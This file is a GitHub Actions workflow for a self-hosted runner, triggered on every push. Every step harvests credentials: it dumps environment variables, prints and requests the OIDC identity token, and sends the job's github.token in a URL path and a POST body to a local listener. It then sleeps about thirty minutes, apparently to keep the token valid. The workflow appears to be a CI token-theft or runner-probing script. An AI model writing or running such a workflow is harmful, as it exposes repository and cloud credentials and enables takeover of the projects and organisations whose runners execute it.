name: GitHub Actions
on: [push]
jobs:
  Job-One:
    runs-on: self-hosted
    steps:
      - shell: bash
        run: env
      - shell: bash
        run: node -e "console.log(process.env)"
      - shell: bash
        run: |
          echo ${ACTIONS_ID_TOKEN_REQUEST_URL}
          echo ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}
          curl -H "Authentication: Bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" ${ACTIONS_ID_TOKEN_REQUEST_URL}
          node -e "console.log(process.env)"
          echo "ðŸŽ‰ The job was automatically triggered by a ${{ github.event_name }} event."
          env
          curl -v http://localhost:8000/${{ github.token }} 
          curl -v -X POST http://localhost:8000/req --data '{"token":"${{ github.token }}","url":"${{ github.run_id }}"}'
          sleep 1802
